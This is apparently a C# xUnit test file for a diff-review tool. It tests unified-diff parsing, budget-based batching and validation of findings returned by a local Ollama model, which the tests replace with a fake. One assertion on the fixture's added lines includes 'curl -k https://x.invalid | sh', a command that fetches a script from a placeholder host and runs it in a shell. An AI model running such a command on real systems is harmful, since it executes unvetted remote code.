using System.Text;
using System.Text.Json.Nodes;
using ProjectBuddy.PeerOllama;
using Xunit;

namespace ProjectBuddy.PeerAdvise.Tests;

public class UnifiedDiffTests
{
    private static IReadOnlyList<FileDiff> Files() => UnifiedDiff.Parse(Fixtures.Diff);

    [Fact]
    public void ParseKeepsOnlyFilesWithAddedLines()
    {
        Assert.Equal(["src/app.py", "new.sh", "raw.txt"], Files().Select(file => file.Path));
    }

    [Fact]
    public void AddedLinesCarryNewFileLineNumbers()
    {
        var app = Files()[0];
        Assert.Equal(
            [(2, "token = read_token()"), (3, "logging.info(\"token %s\", token)"), (22, "    risky()"), (23, "++ not a header inside a hunk")],
            app.Added.Select(line => (line.NewLine!.Value, line.Text)));
        Assert.Equal(2, app.Hunks.Count);
        var empty = app.Hunks[0].Lines[4];
        Assert.Equal((DiffLineKind.Context, 4, ""), (empty.Kind, empty.NewLine!.Value, empty.Text));
        Assert.Null(app.Hunks[0].Lines[1].NewLine);
        Assert.Equal([(1, "#!/bin/sh"), (2, "curl -k https://x.invalid | sh")], Files()[1].Added.Select(line => (line.NewLine!.Value, line.Text)));
    }

    [Fact]
    public void ParseAcceptsWindowsLineEndingsAndIgnoresTextOutsideFiles()
    {
        Assert.Single(UnifiedDiff.Parse("noise\r\ndiff --git a/x b/x\r\n--- a/x\r\n+++ b/x\r\n@@ -1 +1 @@\r\n+y\r\n"));
        Assert.Empty(UnifiedDiff.Parse("just text\n+not a diff"));
        Assert.Empty(UnifiedDiff.Parse("diff --git a/x b/x\n--- a/x\n+++ b/x\nno hunk here"));
    }

    [Fact]
    public void ALeadingByteOrderMarkDoesNotHideTheFirstFile() =>
        Assert.Equal(Files().Select(file => file.Path), UnifiedDiff.Parse("\uFEFF" + Fixtures.Diff).Select(file => file.Path));

    [Theory]
    [InlineData("@@ -1 +99999999999 @@")]
    [InlineData("@@ -1 +100000001 @@")]
    public void UnusableHunkNumbersAreRefused(string header) =>
        Assert.Equal(ExitCodes.Refused, Assert.Throws<PeerException>(() => UnifiedDiff.Parse($"diff --git a/x b/x\n--- a/x\n+++ b/x\n{header}\n+y")).ExitCode);

    [Fact]
    public void NonAsciiDigitsAreNotAHunkHeader() =>
        Assert.Empty(UnifiedDiff.Parse("diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +\u0661\u0662 @@\n+y"));

    [Theory]
    [InlineData("+++ \"b/t\\303\\253st.cs\"", "tëst.cs")]
    [InlineData("+++ \"b/a\\\"q\\\\x\\tz\\n\\r\\a\\b\\f\\v\"", "a\"q\\x\tz\n\r\a\b\f\v")]
    [InlineData("+++ \"b/\U0001F600 \\\"q\"", "\U0001F600 \"q")]
    [InlineData("+++ w/x.cs", "x.cs")]
    [InlineData("+++ i/x.cs", "x.cs")]
    [InlineData("+++ \"", "\"")]
    [InlineData("+++ plain.cs", "plain.cs")]
    public void TargetsAreUnquotedAndUnprefixed(string target, string path) =>
        Assert.Equal(path, Assert.Single(UnifiedDiff.Parse($"diff --git a/x b/x\n--- a/x\n{target}\n@@ -0,0 +1 @@\n+y")).Path);

    [Theory]
    [InlineData("\"b/\\q\"")]
    [InlineData("\"b/x\\\"")]
    [InlineData("\"b/\\12\"")]
    [InlineData("\"b/\\477\"")]
    [InlineData("\"b/\\377\"")]
    [InlineData("\"b/\\18x\"")]
    [InlineData("\"b/\\1/x\"")]
    public void BrokenQuotedPathsAreRefused(string target) =>
        Assert.Equal(ExitCodes.Refused, Assert.Throws<PeerException>(() => UnifiedDiff.Unquote(target)).ExitCode);

    [Fact]
    public void RenderNumbersEveryLine()
    {
        var app = Files()[0];
        var text = UnifiedDiff.Render(app.Path, [app.Hunks[1]]);
        Assert.Equal("=== file: src/app.py\n@@ -20,2 +21,3 @@\n    21| try:\n+   22|     risky()\n+   23| ++ not a header inside a hunk\n", text);
        Assert.Contains("-     | token = read()", UnifiedDiff.Render(app.Path, [app.Hunks[0]]));
    }
}

public class PreReviewBatchTests
{
    private static FileDiff File(string path, int added, int width = 10) =>
        new(path, [new DiffHunk("@@ -0,0 +1 @@", Enumerable.Range(1, added).Select(line => new DiffLine(DiffLineKind.Added, line, new string('a', width))).ToList())]);

    [Fact]
    public void SmallFilesShareABatchInPathOrder()
    {
        var plan = PreReview.Batch([File("b.txt", 2), File("a.txt", 2)], 12000);
        var batch = Assert.Single(plan.Batches);
        Assert.StartsWith("=== file: a.txt", batch.Text);
        Assert.Equal(["a.txt", "b.txt"], batch.Added.Keys.Order(StringComparer.Ordinal));
        Assert.Empty(plan.Unreviewed);
    }

    [Fact]
    public void FilesThatDoNotFitTogetherGetTheirOwnBatches()
    {
        var plan = PreReview.Batch([File("a.txt", 10), File("b.txt", 10)], 300);
        Assert.Equal(2, plan.Batches.Count);
        Assert.All(plan.Batches, batch => Assert.True(Encoding.UTF8.GetByteCount(batch.Text) <= 300));
    }

    [Fact]
    public void AHunkTooLargeIsSplitIntoWindowsKeepingLineNumbers()
    {
        var plan = PreReview.Batch([File("big.txt", 30)], 200);
        Assert.True(plan.Batches.Count > 1);
        Assert.Contains("(part 2)", plan.Batches[1].Text);
        Assert.Equal(Enumerable.Range(1, 30), plan.Batches.SelectMany(batch => batch.Added["big.txt"].Keys).Order());
        Assert.All(plan.Batches, batch => Assert.True(Encoding.UTF8.GetByteCount(batch.Text) <= 200));
    }

    [Fact]
    public void HunksOfOneFileAreGroupedUntilTheyNoLongerFit()
    {
        var hunks = Enumerable.Range(0, 4).Select(index => new DiffHunk($"@@ -{index * 10} +{index * 10} @@", [new DiffLine(DiffLineKind.Added, index * 10 + 1, new string('h', 40))])).ToList();
        var plan = PreReview.Batch([new FileDiff("f.txt", hunks)], 160);
        Assert.Equal(2, plan.Batches.Count);
        Assert.Equal([1, 11], plan.Batches[0].Added["f.txt"].Keys.Order());
    }

    [Fact]
    public void WindowsThatFitAreNeverReportedAsOversized()
    {
        for (var width = 10; width <= 120; width++)
        {
            var plan = PreReview.Batch([File("w.txt", 60, width)], 600);
            Assert.Empty(plan.Unreviewed);
            Assert.Equal(Enumerable.Range(1, 60), plan.Batches.SelectMany(batch => batch.Added["w.txt"].Keys).Order());
            Assert.All(plan.Batches, batch => Assert.True(Encoding.UTF8.GetByteCount(batch.Text) <= 600));
        }
    }

    [Fact]
    public void WindowsWithoutAddedLinesAreSkippedAndOversizedLinesReported()
    {
        var lines = new List<DiffLine>
        {
            new(DiffLineKind.Context, 1, new string('c', 150)),
            new(DiffLineKind.Removed, null, new string('r', 150)),
            new(DiffLineKind.Added, 2, new string('x', 500)),
            new(DiffLineKind.Added, 3, "short"),
        };
        var plan = PreReview.Batch([new FileDiff("w.txt", [new DiffHunk("@@ -1 +1 @@", lines)])], 200);
        var unreviewed = Assert.Single(plan.Unreviewed);
        Assert.Equal("a single line exceeds the budget", unreviewed["reason"]!.GetValue<string>());
        var batch = Assert.Single(plan.Batches);
        Assert.Equal([3], batch.Added["w.txt"].Keys);
    }
}

public class PreReviewTests
{
    private static OllamaClient Client(FakeOllama fake) => new(fake, new Uri("http://127.0.0.1:11435/"), TimeSpan.FromSeconds(5));

    private static ReviewBatch Batch() => PreReview.Batch(UnifiedDiff.Parse(Fixtures.Diff), 12000).Batches.Single();

    private static JsonObject Finding(string file, object line, string rule, string message = "a real problem") => new()
    {
        ["file"] = file,
        ["line"] = JsonValue.Create(line),
        ["ruleId"] = rule,
        ["message"] = message,
    };

    private static JsonObject Findings(params JsonObject[] findings) =>
        FakeOllama.Reply(new JsonObject { ["findings"] = new JsonArray(findings.Select(finding => (JsonNode?)finding).ToArray()) }.ToJsonString());

    private static async Task<JsonObject> Run(FakeOllama fake, JsonObject? policy = null, string diff = Fixtures.Diff)
    {
        using var client = Client(fake);
        return await PreReview.RunAsync(Fixtures.ParsePolicy(policy), Encoding.UTF8.GetBytes(diff), client);
    }

    [Fact]
    public async Task AnchoredFindingsAreSortedDedupedAndCarryTheirCode()
    {
        var fake = new FakeOllama();
        fake.Replies.Enqueue(Findings(
            Finding("src/app.py", 22, "swallowed-error"),
            Finding("src/app.py", 3, "secret-in-log", " logs the token "),
            Finding("src/app.py", 3, "secret-in-log", "duplicate"),
            Finding("src/app.py", 99, "naming")));
        var policy = Fixtures.Policy();
        policy["preReview"]!["maxFindings"] = 5;
        var report = await Run(fake, policy);
        Assert.Equal(1, report["dropped"]!["unanchored"]!.GetValue<int>());
        Assert.Equal(0, report["dropped"]!["overLimit"]!.GetValue<int>());
        var findings = report["findings"]!.AsArray();
        Assert.Equal(2, findings.Count);
        Assert.Equal(
            ("src/app.py", 3, "secret-in-log", "blocker", "logs the token", "logging.info(\"token %s\", token)"),
            (findings[0]!["file"]!.GetValue<string>(), findings[0]!["line"]!.GetValue<int>(), findings[0]!["ruleId"]!.GetValue<string>(),
             findings[0]!["severity"]!.GetValue<string>(), findings[0]!["message"]!.GetValue<string>(), findings[0]!["code"]!.GetValue<string>()));
        Assert.False(findings[0]!["generic"]!.GetValue<bool>());
        Assert.Equal("warning", findings[1]!["severity"]!.GetValue<string>());
        Assert.Equal("""{"total":2,"specific":2,"blockers":1,"warnings":1,"nits":0}""", report["summary"]!.ToJsonString());
        Assert.True(report["coverage"]!["complete"]!.GetValue<bool>());
        Assert.Equal(7, report["coverage"]!["addedLines"]!.GetValue<int>());
        Assert.Equal("reviewed", report["receipt"]!["batches"]![0]!["outcome"]!.GetValue<string>());
        Assert.Equal(Versions.PreReviewSchema, report["schema"]!.GetValue<string>());
        var request = fake.TriageRequests.Single();
        Assert.Equal(512, request["options"]!["num_predict"]!.GetValue<int>());
        Assert.Contains("Report at most 5 findings.\nRules:\n- secret-in-log: secret-in-log guidance", request["messages"]![0]!["content"]!.GetValue<string>());
    }

    [Fact]
    public async Task FindingsBeyondTheLimitAreDroppedAndCounted()
    {
        var fake = new FakeOllama();
        fake.Replies.Enqueue(Findings(
            Finding("new.sh", 1, "naming"), Finding("new.sh", 2, "naming"), Finding("raw.txt", 1, "naming"), Finding("src/app.py", 2, "naming")));
        var report = await Run(fake);
        Assert.Equal(3, report["summary"]!["nits"]!.GetValue<int>());
        Assert.Equal(1, report["dropped"]!["overLimit"]!.GetValue<int>());
    }

    [Fact]
    public async Task RejectedAndMalformedBatchesAreReportedAsUnreviewed()
    {
        var policy = Fixtures.Policy();
        policy["maxInputBytes"] = 1024;
        policy["preReview"]!["maxBatches"] = 1;
        var big = string.Join('\n', Enumerable.Range(1, 80).Select(line => "+" + new string('z', 40)));
        var diff = $"diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -0,0 +1,80 @@\n{big}\n" + Fixtures.Diff;
        var fake = new FakeOllama();
        fake.Replies.Enqueue(FakeOllama.Reply("{}", 8194));
        var error = await Assert.ThrowsAsync<PeerException>(() => Run(fake, policy, diff));
        Assert.Equal(AdviseExitCodes.NoAdvice, error.ExitCode);

        policy["preReview"]!["maxBatches"] = 3;
        fake = new FakeOllama();
        fake.Replies.Enqueue(FakeOllama.Reply("{}", 8194));
        fake.Replies.Enqueue(FakeOllama.Reply("not json"));
        fake.Replies.Enqueue(Findings());
        var report = await Run(fake, policy, diff);
        var reasons = report["coverage"]!["unreviewed"]!.AsArray().Select(item => item!["reason"]!.GetValue<string>()).Distinct().ToList();
        Assert.Equal(["the prompt may have been cut", "the reply was not a findings list", "batch limit reached"], reasons);
        Assert.False(report["coverage"]!["complete"]!.GetValue<bool>());
        Assert.Equal(["rejected", "malformed", "reviewed"], report["receipt"]!["batches"]!.AsArray().Select(batch => batch!["outcome"]!.GetValue<string>()));
    }

    [Fact]
    public async Task APathThatAppearsTwiceIsRefusedBeforeContactingOllama()
    {
        var fake = new FakeOllama();
        var twice = "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -0,0 +1 @@\n+a\ndiff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1,2 @@\n a\n+b";
        var error = await Assert.ThrowsAsync<PeerException>(() => Run(fake, diff: twice));
        Assert.Equal(ExitCodes.Refused, error.ExitCode);
        Assert.Contains("x appears more than once", error.Message);
        Assert.Empty(fake.Requests);
    }

    [Fact]
    public async Task ADiffWithNothingToReviewIsRefused()
    {
        var fake = new FakeOllama();
        Assert.Equal(ExitCodes.Refused, (await Assert.ThrowsAsync<PeerException>(() => Run(fake, diff: "diff --git a/x b/x\n--- a/x\n+++ /dev/null\n@@ -1 +0,0 @@\n-x"))).ExitCode);
        Assert.Empty(fake.Requests);
    }

    public static TheoryData<string, JsonNode?, string> Rejected => new()
    {
        { "not an object", JsonValue.Create(1), "malformed" },
        { "extra key", new JsonObject { ["file"] = "new.sh", ["line"] = 1, ["ruleId"] = "naming", ["message"] = "m", ["severity"] = "nit" }, "malformed" },
        { "missing file", new JsonObject { ["fil"] = "new.sh", ["line"] = 1, ["ruleId"] = "naming", ["message"] = "m" }, "malformed" },
        { "unknown rule", Finding("new.sh", 1, "style"), "malformed" },
        { "line not a number", Finding("new.sh", "1", "naming"), "malformed" },
        { "fractional line", Finding("new.sh", 1.5, "naming"), "malformed" },
        { "empty message", Finding("new.sh", 1, "naming", "  "), "malformed" },
        { "long message", Finding("new.sh", 1, "naming", new string('m', PreReview.MaxMessageChars + 1)), "malformed" },
        { "two-line message", Finding("new.sh", 1, "naming", "a\nb"), "malformed" },
        { "file not in diff", Finding("other.sh", 1, "naming"), "unanchored" },
        { "context line", Finding("src/app.py", 21, "naming"), "unanchored" },
        { "blank added line", Finding("blank.txt", 1, "naming"), "unanchored" },
    };

    [Theory]
    [MemberData(nameof(Rejected))]
    public void FindingsThatCannotBeCheckedAreDropped(string label, JsonNode? node, string reason)
    {
        var batch = Batch();
        var withBlank = new ReviewBatch(batch.Text, new Dictionary<string, IReadOnlyDictionary<int, string>>(batch.Added) { ["blank.txt"] = new Dictionary<int, string> { [1] = "   " } });
        var (finding, why) = PreReview.Validate(Fixtures.ParsePolicy(), withBlank, node);
        Assert.Null(finding);
        Assert.Equal(reason, why);
        Assert.False(string.IsNullOrEmpty(label));
    }

    [Fact]
    public async Task GuidanceEchoesAreLabelledGenericAndSortedLast()
    {
        var fake = new FakeOllama();
        fake.Replies.Enqueue(Findings(
            Finding("new.sh", 1, "secret-in-log", "Secret-in-log GUIDANCE."),
            Finding("src/app.py", 3, "secret-in-log", "logs the token value")));
        var report = await Run(fake);
        var findings = report["findings"]!.AsArray();
        Assert.Equal(["src/app.py", "new.sh"], findings.Select(finding => finding!["file"]!.GetValue<string>()));
        Assert.True(findings[1]!["generic"]!.GetValue<bool>());
        Assert.Equal(1, report["summary"]!["specific"]!.GetValue<int>());
    }

    [Theory]
    [InlineData("secret-in-log guidance", true)]
    [InlineData("guidance", true)]
    [InlineData("!!!", true)]
    [InlineData("the token is written to the log", false)]
    public void GenericMeansNothingBeyondTheGuidance(string message, bool generic) =>
        Assert.Equal(generic, PreReview.Generic(message, "secret-in-log guidance"));

    [Fact]
    public void FormatLimitsRulesToThePolicy()
    {
        var format = PreReview.Format(Fixtures.ParsePolicy());
        Assert.Equal("""["secret-in-log","swallowed-error","naming"]""", format["properties"]!["findings"]!["items"]!["properties"]!["ruleId"]!["enum"]!.ToJsonString());
    }
}
